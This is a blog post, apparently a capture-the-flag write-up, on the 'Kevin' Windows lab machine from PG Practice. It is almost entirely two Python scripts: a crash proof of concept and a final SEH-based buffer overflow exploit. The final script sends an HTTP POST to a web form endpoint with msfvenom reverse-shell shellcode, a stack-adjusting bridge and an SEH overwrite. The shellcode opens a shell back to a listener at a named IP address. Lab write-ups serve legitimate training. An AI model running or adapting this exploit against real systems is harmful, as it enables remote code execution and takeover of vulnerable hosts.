---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/wwyoh2kEO9I/0.jpg
layout: post
media_subpath: /assets/posts/2021-09-25-seh-based-buffer-overflow-with-space-limitations-kevin-pg-practice
tags:
- binary exploitation
- pg practice
- seh buffer overflow
title: SEH Based Buffer Overflow with Space Limitations - Kevin @ PG Practice
---

We are solving Kevin, an easy-rated Windows machine on PG Practice that involves a SEH Based Buffer Overflow.

{% youtube wwyoh2kEO9I %}

## Notes

**Starting PoC**

```python
#!/usr/bin/python
from pwn import *
from urllib import parse
from time import sleep
from sys import argv,exit
from os import system

HOST = ""
PORT = 80

buffer = b"A"* 800

content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: application/json\r\n"
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

p = remote(HOST, PORT)
p.send(payload)
p.close()
```

**Final Exploit**

```python
#!/usr/bin/python
from pwn import *
from urllib import parse
from time import sleep
from sys import argv,exit
from os import system

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b "\x00" LHOST=192.168.49.208 LPORT=443 -f python
buf =  b""
buf += b"\xdb\xd9\xd9\x74\x24\xf4\x5f\xba\xaa\x08\xe1\xdf\x31"
buf += b"\xc9\xb1\x52\x31\x57\x17\x03\x57\x17\x83\x45\xf4\x03"
buf += b"\x2a\x65\xed\x46\xd5\x95\xee\x26\x5f\x70\xdf\x66\x3b"
buf += b"\xf1\x70\x57\x4f\x57\x7d\x1c\x1d\x43\xf6\x50\x8a\x64"
buf += b"\xbf\xdf\xec\x4b\x40\x73\xcc\xca\xc2\x8e\x01\x2c\xfa"
buf += b"\x40\x54\x2d\x3b\xbc\x95\x7f\x94\xca\x08\x6f\x91\x87"
buf += b"\x90\x04\xe9\x06\x91\xf9\xba\x29\xb0\xac\xb1\x73\x12"
buf += b"\x4f\x15\x08\x1b\x57\x7a\x35\xd5\xec\x48\xc1\xe4\x24"
buf += b"\x81\x2a\x4a\x09\x2d\xd9\x92\x4e\x8a\x02\xe1\xa6\xe8"
buf += b"\xbf\xf2\x7d\x92\x1b\x76\x65\x34\xef\x20\x41\xc4\x3c"
buf += b"\xb6\x02\xca\x89\xbc\x4c\xcf\x0c\x10\xe7\xeb\x85\x97"
buf += b"\x27\x7a\xdd\xb3\xe3\x26\x85\xda\xb2\x82\x68\xe2\xa4"
buf += b"\x6c\xd4\x46\xaf\x81\x01\xfb\xf2\xcd\xe6\x36\x0c\x0e"
buf += b"\x61\x40\x7f\x3c\x2e\xfa\x17\x0c\xa7\x24\xe0\x73\x92"
buf += b"\x91\x7e\x8a\x1d\xe2\x57\x49\x49\xb2\xcf\x78\xf2\x59"
buf += b"\x0f\x84\x27\xcd\x5f\x2a\x98\xae\x0f\x8a\x48\x47\x45"
buf += b"\x05\xb6\x77\x66\xcf\xdf\x12\x9d\x98\x1f\x4a\xac\x88"
buf += b"\xc8\x89\xce\x29\xb2\x07\x28\x43\xd4\x41\xe3\xfc\x4d"
buf += b"\xc8\x7f\x9c\x92\xc6\xfa\x9e\x19\xe5\xfb\x51\xea\x80"
buf += b"\xef\x06\x1a\xdf\x4d\x80\x25\xf5\xf9\x4e\xb7\x92\xf9"
buf += b"\x19\xa4\x0c\xae\x4e\x1a\x45\x3a\x63\x05\xff\x58\x7e"
buf += b"\xd3\x38\xd8\xa5\x20\xc6\xe1\x28\x1c\xec\xf1\xf4\x9d"
buf += b"\xa8\xa5\xa8\xcb\x66\x13\x0f\xa2\xc8\xcd\xd9\x19\x83"
buf += b"\x99\x9c\x51\x14\xdf\xa0\xbf\xe2\x3f\x10\x16\xb3\x40"
buf += b"\x9d\xfe\x33\x39\xc3\x9e\xbc\x90\x47\xae\xf6\xb8\xee"
buf += b"\x27\x5f\x29\xb3\x25\x60\x84\xf0\x53\xe3\x2c\x89\xa7"
buf += b"\xfb\x45\x8c\xec\xbb\xb6\xfc\x7d\x2e\xb8\x53\x7d\x7b"
sc = buf

HOST = ""
PORT = 80

bridge = b""
bridge += b"\x83\xC4\x7F" * 11
bridge += b"\x90\x90\x90" * 2
bridge += b"\x83\xC4\x2B"
bridge += b"\xff\xe4"

buffer = b"\x90"* (751-len(bridge)-len(sc))
buffer += sc
buffer += bridge
buffer += b"\xEB\xD2\x90\x90"
buffer += p32(0x00444527)

content= "dataFormat=comma&exportto=file&fileName=%s" % parse.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: application/json\r\n"
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

p = remote(HOST, PORT)
p.send(payload)
p.close()
```